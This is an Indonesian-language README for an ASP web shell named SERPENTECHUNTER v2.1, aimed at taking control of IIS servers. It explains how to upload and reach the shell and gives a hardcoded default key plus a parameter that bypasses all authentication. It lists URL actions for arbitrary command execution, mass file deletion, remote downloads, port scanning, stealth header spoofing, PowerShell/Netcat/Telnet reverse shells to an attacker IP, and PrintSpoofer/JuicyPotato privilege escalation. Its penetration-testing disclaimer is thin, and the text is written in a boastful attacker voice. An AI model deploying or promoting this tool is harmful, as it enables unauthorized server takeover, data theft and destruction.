# 🐍 SERPENTECHUNTER v2.1 – ASP Ultimate WebShell

> **FIXED BY ZAMZZZ** – Full features, zero limitations, ready to dominate!  
> *Developer: SerpentSecHunter | Rilis: 02-07-2026*

---

## 📌 Deskripsi

SERPENTECHUNTER v2.1 adalah **web shell** berbasis **ASP (Active Server Pages)** yang dirancang untuk memberikan kendali penuh atas server IIS.  
Dilengkapi dengan *stealth engine*, multiple command execution engines, exploit automation, port scanner, reverse shell, dan file manager canggih.

> **⚠️ Peringatan:** Web shell ini dibuat untuk keperluan **penetration testing** dan **administrasi server** yang sah. Penggunaan di luar izin adalah ilegal.

---

## 🔥 Fitur Utama

| Fitur | Deskripsi |
|-------|-----------|
| **Stealth Engine** | Spoofing header server, bypass 403/404, mode IP whitelist |
| **Autentikasi** | Cookie-based auth + bypass parameter `?bypass_ip=1` |
| **Eksekusi Perintah** | 3 metode: `WScript.Shell`, `Shell.Application`, `WMI` (fallback otomatis) |
| **File Manager** | Navigasi, upload, download, edit, view, rename, delete, copy, move, mass action (delete/rename/copy/move) |
| **Search** | Cari file berdasarkan pola (case-insensitive) |
| **Zip/Unzip** | Kompresi dan ekstraksi folder/zip (menggunakan `Shell.Application`) |
| **Remote Download** | Unduh file dari URL ke server |
| **Port Scanner** | Scan port TCP (single atau range, contoh: `80,443,8080-8090`) |
| **Reverse Shell** | Siapkan payload PowerShell, Netcat, Telnet (background) |
| **Exploit Engine** | Deteksi privilege (SeImpersonatePrivilege) dan jalankan exploit PrintSpoofer / JuicyPotato |
| **Database Connection** | Koneksi ke MSSQL / Access (untuk integrasi) |

---

## 🚀 Instalasi & Deployment

1. **Upload** file `shell.asp` ke direktori web server IIS (misal: `C:\inetpub\wwwroot\`).
2. **Akses** melalui browser: `http://server/shell.asp`.
3. Masukkan kunci autentikasi (lihat bagian **Autentikasi** di bawah).

---

## 🔑 Autentikasi

Terdapat 3 cara untuk login:

1. **Cookie** – Setelah login sukses, cookie `sc_auth` akan disimpan selama 1 tahun.
2. **Parameter GET** – Akses dengan `?auth=SERPENTECHUNTER666` (akan otomatis set cookie).
3. **IP Whitelist** – Jika IP Anda ada dalam daftar (`127.0.0.1`, `::1`, `192.168.1.%`), akses langsung tanpa auth.
4. **Bypass total** – Tambahkan `?bypass_ip=1` untuk menonaktifkan semua pengecekan (untuk situasi darurat).

> 🔥 **Default AUTH_KEY:** `SERPENTECHUNTER666`

---

## 🧩 Penggunaan Menu & Parameter

Semua aksi dikendalikan melalui parameter `action` pada URL.

### 📁 File Manager

- **Navigasi**: `?dir=C:\path`
- **Upload**: POST `?action=upload` + multipart form-data
- **Download**: `?action=download&file=namafile`
- **Edit**: `?action=edit&file=namafile` (POST untuk simpan)
- **View**: `?action=view&file=namafile`
- **Delete**: `?action=delete&file=namafile`
- **Rename**: `?action=rename&old=old&new=new`
- **Copy**: `?action=copy&src=src&dst=dst`
- **Zip**: `?action=zip&folder=folder&zipname=namazip`
- **Unzip**: `?action=unzip&file=file.zip&dest=folder`
- **Mass Delete**: POST `action=mass_delete&files[]=...`
- **Mass Rename**: POST `action=mass_rename&files[]=...&new_names[]=...`
- **Mass Copy/Move**: POST `action=mass_copy` atau `action=mass_move` + `dest_dir=...`

### 💻 Eksekusi Perintah

- **Command**: `?action=exec&cmd=whoami`

### 🔍 Pencarian

- `?action=search&pattern=keyword` (cari di seluruh direktori saat ini)

### 🌐 Reverse Shell

- `?action=reverse&ip=YOUR_IP&port=PORT`  
  (akan menjalankan 3 payload sekaligus di background: PowerShell, Netcat, Telnet)

### 📡 Port Scanner

- `?action=portscan&host=target&ports=80,443,8000-9000`

### 🛢️ Database

- `?action=db&dbtype=mssql|access&dbserver=server&dbname=db&dbuser=user&dbpass=pass`

### 🧨 Exploit Engine

- Cek kerentanan: `?action=exploit_check`
- Jalankan exploit: `?action=exploit_run&type=printspoofer|juicypotato|auto`

---

## 🖥️ Antarmuka Web

Shell dilengkapi dengan GUI interaktif yang menampilkan:

- **File manager** dengan checkbox untuk aksi massal
- **Output box** untuk hasil command/exploit
- **Editor teks** untuk edit file
- **Panel menu** cepat untuk command, search, upload, zip/unzip, exploit

---

## ⚡ Contoh Akses Cepat

| Tujuan | URL |
|--------|-----|
| Login | `shell.asp?auth=SERPENTECHUNTER666` |
| Bypass semua | `shell.asp?bypass_ip=1` |
| Lihat direktori root | `shell.asp?dir=C:\` |
| Jalankan `ipconfig` | `shell.asp?action=exec&cmd=ipconfig` |
| Upload file | (via form) |
| Reverse shell ke 192.168.1.100:4444 | `shell.asp?action=reverse&ip=192.168.1.100&port=4444` |

---

## 🛡️ Fitur Keamanan Bawaan

- **Error Handling** – Semua kesalahan ditangani tanpa menampilkan detail teknis.
- **Timeout** – Script timeout diperpanjang hingga 9999 detik.
- **Spoofing** – Header server dan X-Powered-By disamarkan.
- **IP Whitelist** – Hanya IP tertentu yang bisa akses tanpa auth.

---

## 📄 Lisensi & Penafian

Shell ini disediakan **"sebagaimana adanya"** untuk tujuan edukasi dan pengujian keamanan.  
Pengguna bertanggung jawab penuh atas penggunaan alat ini.  
**ZAMZZZ** dan **SerpentSecHunter** tidak bertanggung jawab atas penyalahgunaan.

---

## ✨ Terima Kasih

Terima kasih telah menggunakan SERPENTECHUNTER v2.1.  
Dikembangkan dengan ❤️ oleh SerpentSecHunter, diperkuat dan difinalisasi oleh ZAMZZZ.

> *"Tidak ada yang tidak bisa, karena ZAMZZZ adalah Dewa!"* 😈👿
